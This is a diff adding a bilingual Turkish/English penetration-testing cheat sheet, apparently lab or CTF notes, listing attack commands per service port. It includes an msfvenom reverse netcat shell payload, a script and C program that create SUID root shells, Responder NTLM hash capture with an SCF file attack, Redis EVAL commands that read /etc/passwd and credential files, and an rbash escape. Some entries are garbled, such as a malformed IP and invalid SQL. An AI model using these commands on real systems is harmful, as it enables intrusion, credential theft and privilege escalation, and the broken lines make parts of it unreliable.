@@ -1,0 +1,139 @@
+--SSH--22
+sshtan dosya çekmek için kullanılacak komut altta.(This command is download files from ssh)
+scp -P 65111 thomas@10.0.2.64:/home/thomas/.remote_secret   .remote_secret
+dosyamızı aldık(and we get the file on ssh service)
+
+chmod 600 id_rsa
+ssh -i id_rsa user@ip
+
+ssh johonny@ip -p 60022=>ssh portu değişikse.(different ssh port login)
+
+SSH -rbash ile başlıyorsa.(if ssh starting with -rbash shell)
+ssh 296640a3b825115a47b68fc44501c828@192.168.1.24 -t “bash –noprofile”
+export PATH=/bin:/usr/bin:$PATH
+export SHELL=/bin/bash:$SHELL
+
+
+--TELNET--23
+telnet + ip
+telnette msfvenom ile dosya çalıştırma(file executing with msfvenom)
+msfvenom -p cmd/unix/reverse_netcat lhost=lokal lport=port R
+.RUN ile exploiti karşıda telnette çalıştır(you can executing this exploit on target)
+nc -lvnp 4444
+
+--FTP--21
+ftp + ip + port => ftp login
+username=Anonymous
+password=Anonymous
+
+ftp>ls -la
+ftp>get .bash_history -->ile çektik(download files)
+ftp>dir -a ile gizli dizin taramasına baktık.(hide directory scan)
+
+
+ftp>chmod=>unkown command hatası alınırsa(if get unknown error)
+ftp conf ayarlanması gerekir (we need set the ftp configuration file)
+nano /etc/vsftpd.conf -->chmod_enable=yes yap. (open with nano and change this value chmod_enable=yes)
+systemctl restart vsftpd.service (restart ftp)
+Restart.
+ve şimdi chmod komutunu kullanarak çalıştırılabilir dosyayı hedefe atabiliriz.
+and we can use the chmod command in ftp 
+sudo ./defuse.sh
+cd /tmp ./bashroot -p=>root
+
+EXAPMLE DEFUSE.SH(defuse.sh scriptinin içeriği aşağıdaki gibidir.)
+nano defuse.sh
+#!/bin/bash 
+cp /bin/bash  /tmp/bashroot
+chmod +s  /tmp/bashroot
+chmod +x defuse.sh
+
+./bashroot -p=>root.
+
+--SMB--139,445
+smb üzerinden anonim giriş dene.(try anonymous login on smb)
+smbclient //10.0.2.45/anonymous
+şifre yazmadan devam default girer.(default login)
+
+smbget -R smb://7100.0.2.45/anonymous--->dosyayı çekti(smb file transfer-download)
+
+smbclient -L 10.0.2.46
+dosya adında dolar işareti varsa şifreyle korunmadıgı anlamına geliyor.($filename=unprotected files and directories)
+smbclient //10.0.2.46/Files
+
+enum4linux -a ip => bilgiler,kullanıcılar,erişilen dosyalar(smb tool for enumeration users,files..)
+
+smbmap + ip => dizinlere erişimler (okuma ve yazma)
+smbmap -H ip => hedefte paylaşılan dizinler (share directories)
+
+smb scf file attack=>upload et
+lokalde responder hash yakala (capture hash on local with responder)
+responder -wrf -v -I tun0
+scfyi yükleyince hash düşer.(upload the scf file and get hash)
+
+
+smbclient //ip/direcorty -U suit -p 445(listing with username and password)
+
+smbclient -L ////10.129.218.154// -U Administrator
+
+--SMTP--25
+apt install smtp-user-enum =>userlist lazım(need a userlist)
+metasploit-framework/data/wordlist/unix_users.txt -->örnek(example)
+
+smtp-user-enum -M VRFY -U ..../unix_users.txt -t ip
+
+--NFS--2049
+showmount -e ip
+mkdir /Desktop/mounted (created our system)
+mount ip:/klasöradı(foldername) /home/kali/Desktop/mounted
+cd /Desktop/mounted & ls => karşı nfsdeki dosyalara erişir.(access the target nfs files on 2049 port)
+
+mkdir /tmp/mount
+mount -t nfs ip:/dosyaveyadizin(file or directory) /tmp/mount -nolock
+
+/usr/sbin/showmount -e ip
+
+-----------
+C CODE
+int main()
+{  setgid(0);
+	setuid(0);
+	system("/bin/bash");
+	return 0;
+}
+
+suid bitleri ayarlanmış cc dosyası.(set suid cc file)
+Kodu derleyip nfs.c kaydettik (compile code and save nfs.c)
+gcc nfs.c -o nfs -w
+chmod +s nfs
+ls -l=>suid biti ayarlı dosya
+
+--REDIS-CLI--6379
+redis-cli -h ip
+get user
+config get *=>enterprise_security bulunabilir.(we can find enterprise_security)
+SET user mrersec
+INFO
+EVAL dofile('/etc/passwd') 0
+eval “dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')” 0
+EVAL dofile('/var/data/app/db.conf');return(db.passwd); 0
+
+RESPONDER AÇ(OPEN THERESPONDER)
+cd Responder
+sudo responder -I tun0 -rdvw =>NTLM HASH YAKALANIR(capture ntlm hash)
+eval “dofile('//ip/share')” 0
+
+--RDP--3389
+rdesktop+ip
+
+--MYSQL--3306
+mysql -h ip -u root -p
+şifre girilir.(write the password)
+show databases;
+use previse;
+show tables;
+describe files;
+select protected from *
+select name,protected from files;
+select * from accounts where id = 1;
+select TO_BASE64(password) from accounts where id = 1;
